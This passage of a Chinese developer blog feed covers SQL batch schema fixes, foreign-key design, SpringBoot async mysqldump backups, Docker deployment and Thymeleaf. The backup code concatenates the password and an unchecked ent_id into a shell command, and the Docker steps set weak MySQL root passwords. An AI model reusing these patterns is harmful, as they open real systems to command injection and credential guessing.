      <title>数据库批量修改语句生成查询语句</title>
      <link href="/2020/08/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E8%AF%AD%E5%8F%A5%E7%94%9F%E6%88%90%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5/"/>
      <url>/2020/08/15/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E8%AF%AD%E5%8F%A5%E7%94%9F%E6%88%90%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在接老师开发商业性质的项目的时候，接受了一个批量修改数据库的任务，花费了自己蛮多心血特此记录一下。</p><h2 id="任务要求"><a href="#任务要求" class="headerlink" title="任务要求"></a>任务要求</h2><p>任务详情：<br>数据库的表结构不统一，字段列名缺失以及长度不匹配。<br>在现有的数据库中，每张表都有 CREATER，CREATER_ID，CREATE_DATE，UPDATER，UPDATER_ID，UPDATE_DATE等字段，编写一个工具，用于：</p><ol><li>确保一致性：每张表内的这些字段名字，类型，长度都相同</li><li>统一被修改：批量修改这些字段的名字，类型，长度<br><img src="/img/sql/sql工具.PNG" alt=""></li></ol><h2 id="解决思路-amp-方案"><a href="#解决思路-amp-方案" class="headerlink" title="解决思路&amp;方案"></a>解决思路&amp;方案</h2><p>刚开始时想复杂了，脚本学习较少，时间紧迫，于是选择从sql查询语句入手，一直往IF EXISTS钻牛角尖，但批量多表操作的拼接折磨了我很久，后续将问题简单化为将对应数据库没有字段的表添加字段列，再将所有表对应字段列的属性以及长度更新校验更正为任务要求的。</p><p>拼接代码：<br>注意：除CREATER其它字段sql全部省略,下为核心拼接代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">START TRANSACTION;</span><br><span class="line">SELECT DISTINCT CONCAT(<span class="string">'ALTER TABLE '</span>,table_name,<span class="string">' ADD COLUMN CREATER VARCHAR(32);'</span>) FROM information_schema.tables WHERE table_schema = DATABASE() AND TABLE_NAME NOT IN (SELECT TABLE_NAME FROM information_schema.columns WHERE table_schema = DATABASE() AND column_name LIKE <span class="string">'CREATER'</span>);</span><br><span class="line"></span><br><span class="line">SELECT CONCAT(<span class="string">'ALTER TABLE '</span>,table_name,<span class="string">' MODIFY  COLUMN CREATER VARCHAR(32);'</span>) from information_schema.`TABLES`WHERE table_schema=<span class="string">'agency_test'</span>;</span><br><span class="line">COMMIT;</span><br></pre></td></tr></table></figure></p><h2 id="sql注意事项"><a href="#sql注意事项" class="headerlink" title="sql注意事项"></a>sql注意事项</h2><p>SQL语句进行列名字段查询时，注意取反编写，不可直接写 column_name not like ‘字段名’，column_name like ‘字段名’逻辑为会选取发现每个表的列名与like的字段进行对比，只要有和对应字段名相同的列名及选出该表，not like会导致只要表中有与like的字段不匹配的表便会选出该表，只要表含多个列名基本便会选出导致与需求不服。</p><h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><ol><li><p>在要修改的数据库新建查询</p></li><li><p>在查询里黏贴sql查询代码生成脚本的内容并运行</p></li><li><p>保存该查询结果为.txt文件（或sql文件）</p></li><li><p>在该文件内容开头另起一行添加  START TRANSACTION;  内容结尾另一起行添加  COMMIT;</p></li><li><p>将该内容黏贴至新的查询（或运行sql文件注意指定运行sql的数据库）</p></li><li><p>注意：sql查询代码生成脚本未指定生成查询的关联数据库，请在需要使用的数据库使用该查询，若想指定对应数据库请将中所有table_schema=DATABASE()修改为table_schema=’指定数据库’</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库外键与级联的使用考量</title>
      <link href="/2020/08/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%96%E9%94%AE%E4%B8%8E%E7%BA%A7%E8%81%94%E7%9A%84%E4%BD%BF%E7%94%A8%E8%80%83%E9%87%8F/"/>
      <url>/2020/08/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%96%E9%94%AE%E4%B8%8E%E7%BA%A7%E8%81%94%E7%9A%84%E4%BD%BF%E7%94%A8%E8%80%83%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在接触了一些企业级项目后发现，项目对应的数据库设计中很少再设计外键和级联（触发器、级联更新与删除）与大学期间的数据库设计课程以及以往的个人小项目的数据库设计相反，当需要用外键做关联的时候，也是仅对字段进行冗余存储。</p><h2 id="开发规范"><a href="#开发规范" class="headerlink" title="开发规范"></a>开发规范</h2><p>在《阿里巴巴java开发手册》中对数据库设置的规范强调————“【强制】不得使用外键与级联，一切外键概念必须在应用层解决。”</p><h2 id="数据库去外键设计"><a href="#数据库去外键设计" class="headerlink" title="数据库去外键设计"></a>数据库去外键设计</h2><p>解决方案：设计关联表。<br>举例：sys_user用户表与sys_role用户角色表需要对应关联时，再建立一个用户与角色的关联表sys_user_role表，该关联表存储sys_user表与sys_role表的主键id等。<br>设计图例：<br><img src="/img/foreignKey.PNG" alt=" run Dashboard"> </p><h2 id="思考与对比"><a href="#思考与对比" class="headerlink" title="思考与对比"></a>思考与对比</h2><p>去外键以及级联的设计，无疑是将数据的关联设置从数据库中剥离出来，在对数据库数据进行修改时，修改成本降低 （修改时不再考虑外键对应表的处理）统一在后端代码中进行关联设置。有外键的数据设计系统在分布式、高并发集群环境下，容易产生更新风暴，以及外键会影响数据库的插入速度。</p><p>个人开发（小型应用）、数据库读写资源充足（数据库并发低），集中式数据库系统，则应该使用外键保障数据的完整性，减少开发端的负担，有利于数据库开发与程序开发的分离。</p><p>团队开发（大型应用）。数据库的读写成为瓶颈（数据库并发高），分布式数据库系统（分割式存储数据），（如阿里巴巴）则应该在项目业务端实现，团队合作开发模块化突出，通过在业务端设置外键可以减小项目开发时有外键带来的各种不便。同时外键的分布式的数据库存储，数据库中表的分割也使得在数据库端实现外键比较复杂，而在业务端通过代码实现则更灵活。</p>]]></content>
      
      
      <categories>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> foreign key </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot使用@Async实现异步调用</title>
      <link href="/2020/08/08/SpringBoot%E4%BD%BF%E7%94%A8-Async%E5%AE%9E%E7%8E%B0%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8/"/>
      <url>/2020/08/08/SpringBoot%E4%BD%BF%E7%94%A8-Async%E5%AE%9E%E7%8E%B0%E5%BC%82%E6%AD%A5%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在写项目时，有个需求为前端使用用户下载数据库备份压缩文件，其中涉及多表多条件dump备份</p><h2 id="部分代码"><a href="#部分代码" class="headerlink" title="部分代码"></a>部分代码</h2><p>类似方法有4个，未异步调用耗时较长影响用户体验。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">entIdSqlDumpOne</span><span class="params">(String path, String dateString, String ent_id,String entTableName,String user, String password, String hostIP, String exportDatabaseName)</span></span>&#123;</span><br><span class="line">    String folderName_1 = <span class="string">"ZYK_"</span> + ent_id + <span class="string">"_BackupENT_"</span> + dateString + <span class="string">".sql"</span>;</span><br><span class="line">    PrintWriter printWriter = <span class="keyword">null</span>;</span><br><span class="line">    BufferedReader bufferedReader = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">//Lock lock = new ReentrantLock();</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//lock.lock();</span></span><br><span class="line">        printWriter = <span class="keyword">new</span> PrintWriter(<span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(path + folderName_1), <span class="string">"utf8"</span>));</span><br><span class="line">        Process process = Runtime.getRuntime().exec(<span class="string">" mysqldump -h"</span> + hostIP + <span class="string">" -u"</span> + user + <span class="string">" -p"</span> + password + <span class="string">" --set-charset=UTF8 "</span> + exportDatabaseName +<span class="string">" --tables "</span>+entTableName+<span class="string">" "</span>+<span class="string">"--where=\"ent_id='"</span>+ ent_id + <span class="string">"'\""</span>);</span><br><span class="line">        InputStreamReader inputStreamReader = <span class="keyword">new</span> InputStreamReader(process.getInputStream(), <span class="string">"utf8"</span>);</span><br><span class="line">        bufferedReader = <span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            printWriter.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">        printWriter.flush();</span><br><span class="line">        <span class="keyword">if</span> (process.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> CustomException(<span class="string">"线程未正常中止"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> CustomException(<span class="string">"备份sql操作失败"</span>);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (bufferedReader != <span class="keyword">null</span>) &#123;</span><br><span class="line">                bufferedReader.close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (printWriter != <span class="keyword">null</span>) &#123;</span><br><span class="line">                printWriter.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="设置异步调用"><a href="#设置异步调用" class="headerlink" title="设置异步调用"></a>设置异步调用</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>springboot application类中配置@EnableAsync</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span> </span><br><span class="line"><span class="meta">@EnableAsync</span> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringbootAsyncApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;        </span><br><span class="line"> SpringApplication.run(SpringbootAsyncApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;    </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在需要异步调用的方法头加@Async注解</p></li><li><p>异步调用备份方法</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTask</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">        Future&lt;String&gt; task1 = myTask.entIdSqlDumpOne();</span><br><span class="line">        Future&lt;String&gt; task2 = myTask.entIdSqlDumpTwo();</span><br><span class="line">        Future&lt;String&gt; task3 = myTask.entIdSqlDumpThree();</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(task1.isDone() &amp;&amp; task2.isDone() &amp;&amp; task3.isDone()) &#123;</span><br><span class="line">                <span class="comment">// 三个任务都调用完成，退出循环等待，无法调度完成抛出异常</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 异步调用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异步调用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前后端分离整体项目docker部署</title>
      <link href="/2020/07/25/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E6%95%B4%E4%BD%93%E9%A1%B9%E7%9B%AEdocker%E9%83%A8%E7%BD%B2/"/>
      <url>/2020/07/25/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E6%95%B4%E4%BD%93%E9%A1%B9%E7%9B%AEdocker%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>前后端分离项目涉及vue、nginx与含dockerFile的jar包部署，使用docker一次性部署vue、nginx、jar、mysql。</p><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><h3 id="安装-amp-启动docker"><a href="#安装-amp-启动docker" class="headerlink" title="安装&amp;启动docker"></a>安装&amp;启动docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install docker</span><br><span class="line"></span><br><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//查看镜像</span><br><span class="line">docker images</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用nginx镜像来创建nginx容器实例并运行</span></span><br><span class="line">docker run --name nginx-test -p 80:80 -d nginx</span><br></pre></td></tr></table></figure><p>run 创建容器实例</p><p>— name 容器命名</p><p>-v 映射目录</p><p>-d 设置容器后台运行</p><p>-p 本机端口映射 将容器的80端口映射到本机的80端口</p><h4 id="将nginx关键目录映射到本机"><a href="#将nginx关键目录映射到本机" class="headerlink" title="将nginx关键目录映射到本机"></a>将nginx关键目录映射到本机</h4><p>在本机创建nginx的一些文件存储目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /root/nginx/www /root/nginx/logs /root/nginx/conf</span><br></pre></td></tr></table></figure></p><p>查看nginx-test容器id(containerId)<br>根据id将nginx-test容器配置文件copy到本地<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line">docker cp <span class="string">"containerId"</span>:/etc/nginx/nginx.conf /root/nginx/conf</span><br></pre></td></tr></table></figure></p><p>创建新nginx容器nginx-web,并将www,logs,conf目录映射到本地<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 --name nginx-web -v &#x2F;root&#x2F;nginx&#x2F;www:&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html -v &#x2F;root&#x2F;nginx&#x2F;conf&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf -v &#x2F;root&#x2F;nginx&#x2F;logs:&#x2F;var&#x2F;log&#x2F;nginx nginx</span><br></pre></td></tr></table></figure><br>www: nginx存储网站网页的目录</p><p>logs: nginx日志目录</p><p>conf: nginx配置文件目录</p><p>启动nginx<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start nginx-web</span><br></pre></td></tr></table></figure></p><h4 id="设置反向代理"><a href="#设置反向代理" class="headerlink" title="设置反向代理"></a>设置反向代理</h4><p>进入到/root/conf/nginx.conf vim指令修改即可<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">   listen 80;</span><br><span class="line">   charset utf-8;</span><br><span class="line">   server_name ip地址(xxx.xxx.xxx.xxx);</span><br><span class="line"> </span><br><span class="line">   location / &#123;</span><br><span class="line">      proxy_pass http://ip地址:8080;</span><br><span class="line">      proxy_redirect default;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="部署vue项目"><a href="#部署vue项目" class="headerlink" title="部署vue项目"></a>部署vue项目</h3><p>cd vue项目 ls查看是否有dist与dockerfile 2个文件</p><p>dockerfile内容：<br>作用：指定镜像、将dist文件放到nginx的项目地址路径<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx:latest</span><br><span class="line">MAINTAINER xx</span><br><span class="line">COPY dist/ /usr/share/nginx/html/</span><br></pre></td></tr></table></figure></p><p>dist文件生成：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure></p><p>当前目录部署镜像<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t vueproject .</span><br></pre></td></tr></table></figure></p><h3 id="部署mysql"><a href="#部署mysql" class="headerlink" title="部署mysql"></a>部署mysql</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载镜像</span></span><br><span class="line">docker pull mysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看镜像</span></span><br><span class="line">docker images|grep mysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动容器镜像，建议在/usr/local/workspace/mysql  下执行以下docker  run  命令</span></span><br><span class="line">docker run -p 13306:3306 --name my-mysql -v <span class="variable">$PWD</span>/conf:/etc/mysql -v <span class="variable">$PWD</span>/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7.26</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 建议写死路径,-v挂载路径使即使容器停止运行数据依旧存在</span></span><br><span class="line">docker run -p 13306:3306 --name my-mysql -v /usr/<span class="built_in">local</span>/workspace/mysql/conf:/etc/mysql -v /usr/<span class="built_in">local</span>/workspace/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=root -d mysql</span><br></pre></td></tr></table></figure><h3 id="部署java-web项目"><a href="#部署java-web项目" class="headerlink" title="部署java web项目"></a>部署java web项目</h3><p>编写dockerfile文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM openjdk:11-jre-alpine</span><br><span class="line">ADD statistics_examine.jar app.jar</span><br><span class="line">ENTRYPOINT [<span class="string">"java"</span>,<span class="string">"-jar"</span>,<span class="string">"app.jar"</span>]</span><br></pre></td></tr></table></figure></p><p>构建镜像&amp;运行容器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t spring-hello .</span><br><span class="line"></span><br><span class="line">docker run --name hello-backend -d -p 8000:8080 spring-hello</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大三实训记录——thymeleaf传值给外联js文件</title>
      <link href="/2020/06/25/%E5%A4%A7%E4%B8%89%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94thymeleaf%E4%BC%A0%E5%80%BC%E7%BB%99%E5%A4%96%E8%81%94js%E6%96%87%E4%BB%B6/"/>
      <url>/2020/06/25/%E5%A4%A7%E4%B8%89%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94thymeleaf%E4%BC%A0%E5%80%BC%E7%BB%99%E5%A4%96%E8%81%94js%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="实训"><a href="#实训" class="headerlink" title="实训"></a>实训</h2><p>最近大三下半学期刚刚结束，打算用实训记录类标题记录一下自己实训开发中遇到的一些问题。这次实训由京东互联网科技实践中心的老师授课并且给与我们开发小组达到毕设水平的评价，不知后续参加工作后看大学中开发的项目会有一些什么样的感受。项目后续上传到github上，个人负责建筑平台用户操作系统开发，管理员与评审专家由其他组员开发。</p><h2 id="实训问题——thymeleaf传值给外联js文件"><a href="#实训问题——thymeleaf传值给外联js文件" class="headerlink" title="实训问题——thymeleaf传值给外联js文件"></a>实训问题——thymeleaf传值给外联js文件</h2><p>这次实训中后端业务逻辑、架构、数据库操作没有太大阻力，由于个人前端技术较差，主要问题集中于前端模板与后端的交互。这篇文介绍外联js传值问题。<br>当使用前端模板时想使用如下图的动态显示数据问题时需要解决如何后端向js文件传值，这次实训项目未前后端分离采用thymeleaf模板引擎。<br><img src="/img/design20/countJs.PNG" alt="前端js动态显示数据"> </p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>解决思路：后端传值给html页面，html页面设立全局变量赋值接收，js调用含有该变量的function()方法。<br>项目实例见下方代码：<br>html页面<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script th:inline=<span class="string">"javascript"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">           //&lt;![CDATA[</span><br><span class="line">          var countUser = [[<span class="variable">$&#123;userNumber&#125;</span>]];</span><br><span class="line">          var countExpert = [[<span class="variable">$&#123;expertNumber&#125;</span>]];</span><br><span class="line">          var countProject = [[<span class="variable">$&#123;projectNumber&#125;</span>]];</span><br><span class="line">          var countPrize = [[<span class="variable">$&#123;prizeNumber&#125;</span>]];</span><br><span class="line">          //通过参数传递</span><br><span class="line">          countUp(countUser);</span><br><span class="line">          countUp2(countExpert);</span><br><span class="line">          countUp3(countProject);</span><br><span class="line">          countUp4(countPrize);</span><br><span class="line"></span><br><span class="line">           //]]&gt;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">      &lt;script src=<span class="string">"/js/count.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span> /&gt;&lt;/script&gt;&lt;/section&gt;</span><br></pre></td></tr></table></figure><br>js页面<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> countUp(count)</span><br><span class="line">&#123;</span><br><span class="line">    var div_by = 100,</span><br><span class="line">        speed = Math.round(count / div_by),</span><br><span class="line">        <span class="variable">$display</span> = $(<span class="string">'.count'</span>),</span><br><span class="line">        run_count = 1,</span><br><span class="line">        int_speed = 24;</span><br><span class="line"></span><br><span class="line">    var int = setInterval(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(run_count &lt; div_by)&#123;</span><br><span class="line">            <span class="variable">$display</span>.text(speed * run_count);</span><br><span class="line">            run_count++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(parseInt(<span class="variable">$display</span>.text()) &lt; count) &#123;</span><br><span class="line">            var curr_count = parseInt(<span class="variable">$display</span>.text()) + 1;</span><br><span class="line">            <span class="variable">$display</span>.text(curr_count);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clearInterval(int);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, int_speed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">countUp(countUser);</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> thymeleaf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> thymeleaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idea配置run Dashboard</title>
      <link href="/2020/06/20/idea%E9%85%8D%E7%BD%AErun%20Dashboard/"/>
      <url>/2020/06/20/idea%E9%85%8D%E7%BD%AErun%20Dashboard/</url>
      
        <content type="html"><![CDATA[<h2 id="run-Dashboard功能"><a href="#run-Dashboard功能" class="headerlink" title="run Dashboard功能"></a>run Dashboard功能</h2><p>如下图所示run Dashboard面板可以管理多个服务、modules，对微服务项目以及多modules项目运行和管理十分方便，但idea在运行中不是默认就有run Dashboard的面板<br><img src="/img/design20/Dashboard.PNG" alt=" run Dashboard"> </p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>1.点击多个模块服务启动时的idea右下角弹窗<br><img src="/img/design20/Dashboard-1.PNG" alt=" run Dashboard"><br>2.edit configurations配置，步骤如下图：<br><img src="/img/design20/Dashboard-4.PNG" alt=" run Dashboard"><br><img src="/img/design20/Dashboard-2.PNG" alt=" run Dashboard"><br><img src="/img/design20/Dashboard-3.PNG" alt=" run Dashboard"> </p>]]></content>
      
      
      <categories>
          
          <category> idea </category>
          
      </categories>
      
      
        <tags>
            
            <tag> idea </tag>
            
            <tag> run Dashboard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大三实训记录——springboot2.0后版本配置虚拟路径以访问本地图片</title>
      <link href="/2020/06/20/%E5%A4%A7%E4%B8%89%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94springboot2-0%E5%90%8E%E7%89%88%E6%9C%AC%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E8%B7%AF%E5%BE%84%E4%BB%A5%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87/"/>
      <url>/2020/06/20/%E5%A4%A7%E4%B8%89%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94springboot2-0%E5%90%8E%E7%89%88%E6%9C%AC%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E8%B7%AF%E5%BE%84%E4%BB%A5%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87/</url>
      
